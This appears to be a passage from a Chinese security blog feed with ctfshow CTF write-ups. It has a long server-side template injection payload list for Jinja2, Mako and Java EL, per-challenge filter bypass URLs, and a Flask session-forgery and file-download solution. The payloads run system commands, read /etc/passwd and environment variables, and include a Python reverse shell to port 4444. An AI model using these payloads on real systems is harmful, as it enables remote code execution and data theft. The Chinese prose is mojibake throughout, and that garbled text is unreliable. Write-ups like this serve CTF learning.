java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;flag.txt\&quot;]);&#x27;&quot;).read().zfill(417)&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;</span><br><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cat etc/passwd&#x27;)&#125;</span><br><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;$&#123;self.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.__init__.__globals__[&#x27;util&#x27;].os.system(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.__init__.__globals__[&#x27;os&#x27;].system(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;self.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.joiner.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.namespace.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;namespace.__init__.__globals__.os&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;</span><br><span class="line">&quot;&quot;</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">__</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br><span class="line">&#x27;&#x27;</span><br><span class="line">class</span><br><span class="line">base</span><br><span class="line">bases</span><br><span class="line">subclasses</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">()</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222145988.png" alt="image-20230409222145988"></p><p>ä¼¼ä¹è¿‡æ»¤äº†2å’Œ3</p><p>ç»•è¿‡æ•°å­—ï¼Œéšä¾¿ç”¨ä¸€ä¸ªå­—æ¯å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;c.__init__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">æœ‰<span class="built_in">eval</span>äº†</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222556134.png" alt="image-20230409222556134"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222730355.png" alt="image-20230409222730355"></p><h4 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h4><p>fuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†å•åŒå¼•å·,å¯ä»¥ä½¿ç”¨åœ†æ‹¬å·åŠargs get æˆ–post æˆ– cookieå‚æ•°</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409223204317.png" alt="image-20230409223204317"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">request.args.b</span><br><span class="line">request.values.b</span><br><span class="line">request.cookies.b</span><br><span class="line"></span><br><span class="line">æº</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">//å°†å¸¦å¼•å·çš„popenå’Œlsæ¢æ‰å³å¯</span><br><span class="line">payload</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h4 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h4><p>å¥½åƒå’Œ363ä¸€æ ·è¿‡æ»¤äº†å•åŒå¼•å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://be1c7d5b-82ba-4405-a533-0fc2b28c9dff.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h4 id="365"><a href="#365" class="headerlink" title="365"></a>365</h4><p>è¿‡æ»¤äº†[]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://82ab42e3-eae4-4c5b-80f5-83fae500e217.challenge.ctf.show/?name=&#123;&#123;url_for.__globals__.os.popen(request.values.c).read()&#125;&#125;&amp;c=id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-ç¬¬ä¸‰å±Šæ„šäººæ¯web-wp</title>
      <link href="/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/"/>
      <url>/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h4><p><a href="https://ctf.show/challenges#easy_signin-3967">https://ctf.show/challenges#easy_signin-3967</a></p><p>é¦–å…ˆç»™åˆ°ä¸€ä¸ªurl</p><p><a href="http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=">http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=</a></p><p>urlåimgä¸ºbase64  ZmFjZS5wbmc=   =&gt; face.png</p><p>é‚£å¯ä»¥ç›´æ¥è¯»å–æºç ï¼Œindex.php,    index.php  =&gt; aW5kZXgucGhw</p><p>å³é”®æŸ¥çœ‹æºä»£ç å³å¯çœ‹åˆ°</p><img src='data:image/png;base64,PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezRjNzJiODAwLTMzNjQtNGQ1NC05YWU0LTIwYTE4YzYxYTMxZn0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'/><p>pd9å¼€å¤´ä¸º&lt;?php ç›´æ¥è§£å¯†å³å¯</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406144147722.png" alt="image-20230406144147722"></p><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p><a href="https://ctf.show/challenges#easy_flask-3971">https://ctf.show/challenges#easy_flask-3971</a></p><p>æ‰“å¼€é¢˜ç›®è¿æ¥æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¯ä»¥è¿›è¡Œç”¨æˆ·æ³¨å†Œ</p><p>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><code>https://blog.csdn.net/since_2020/article/details/119543172</code></p><p>éšä¾¿ä¸€ä¸ªç”¨æˆ·æ³¨å†Œï¼Œ123/123ç™»å½•ä¸Šå»ï¼Œå¯ä»¥çœ‹åˆ°learnå¯ä»¥ç‚¹å‡»ï¼ŒæŸ¥çœ‹åˆ°æºä»£ç </p><p>æœ‰ä¸€ä¸ª<code>app.secret_key = &#39;S3cr3tK3y&#39;</code>æœ€ä¸ºæ˜¾çœ¼ï¼Œè”æƒ³åˆ°flask sessionä¼ªé€ ï¼Œ</p><p>å¯ä»¥é‡æ–°ç™»å½•æŠ“åŒ…ï¼Œçœ‹æ˜¯å¦æœ‰session</p><p>Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA</p><p>å¯ä»¥çœ‹åˆ°session jwtç›¸ä¼¼ç”¨<code>https://github.com/noraj/flask-session-cookie-manager</code>è¿™ä¸ªå·¥å…·å¯ä»¥è¿›è¡Œè§£å¯†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA&quot; -s &quot;S3cr3tK3y&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;loggedin&#x27;</span>: True, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰roleå€¼ä¸ºuserï¼Œæºç ä¸­æœªè§ç®¡ç†å‘˜çš„å­—æ ·ï¼Œç›²çŒœä¸ºadminï¼Œæ¥ç€æ„é€ åŒ…</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161237019.png" alt="image-20230406161237019"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py encode -s &quot;S3cr3tK3y&quot; -t &quot;&#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;123&#x27;&#125;&quot;</span></span><br><span class="line">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMjMifQ.ZC5-7A.6id7rF3wmWSp5nux_ylHGAhfbn8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†æ„é€ å¥½çš„æ•°æ®è¿›è¡Œæ›¿æ¢sessionï¼Œè¿™æ ·</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161503735.png" alt="image-20230406161503735"></p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161453957.png" alt="image-20230406161453957"></p><p>å†æ¬¡è®¿é—®ä¸»é¡µé¢ï¼Œå³å¯çœ‹åˆ°ä¸»é¡µé¢å¤šäº†ä¸€ä¸ªä¸‹è½½çš„åœ°æ–¹ï¼Œ</p><p><a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txt%EF%BC%8C%E7%82%B9%E5%87%BB%E6%97%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%8C%E5%9C%A8%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9C%8B%E5%88%B0show%E7%9B%AE%E5%BD%95%E6%97%B6%EF%BC%8C%E5%B7%A6%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AAapp.py%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txtï¼Œç‚¹å‡»æ—¶ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œæ¥ä¸‹æ¥å°±ä¸‹è½½æºç ï¼Œåœ¨æœ€å¼€å§‹çœ‹åˆ°showç›®å½•æ—¶ï¼Œå·¦ä¸Šè§’æœ‰ä¸€ä¸ªapp.pyç›´æ¥ä¸‹è½½ï¼Œä¸‹è½½åå¯ä»¥çœ‹åˆ°æºç </a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span 